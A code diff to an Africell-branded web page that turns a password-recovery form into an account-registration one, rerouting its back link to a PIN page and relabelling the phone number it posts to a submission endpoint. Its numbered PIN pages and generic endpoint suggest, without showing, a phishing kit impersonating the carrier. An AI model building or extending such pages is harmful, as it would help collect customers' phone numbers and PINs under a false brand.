@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Africell | Forgot Password</title>
+    <title>Africell | Account Registration</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -35,8 +35,9 @@
 </head>
 <body>
     <div class="forgot-wrapper">
+        <!-- Back arrow updated to point to pin3.html for Path 3 -->
         <header class="forgot-header">
-            <a href="login.html" class="back-arrow"><i class="fa-solid fa-arrow-left"></i></a>
+            <a href="pin3.html" class="back-arrow"><i class="fa-solid fa-arrow-left"></i></a>
         </header>
 
         <div class="forgot-content">
@@ -107,10 +108,11 @@
                 sendBtn.classList.add('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
+                // Fixed uniqueId to match account registration flow instead of password recovery
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: fullPhone, uniqueId: 'Password Recovery Request' })
+                    body: JSON.stringify({ phone: fullPhone, uniqueId: 'Account Registration Request' })
                 });
 
                 const result = await response.json();
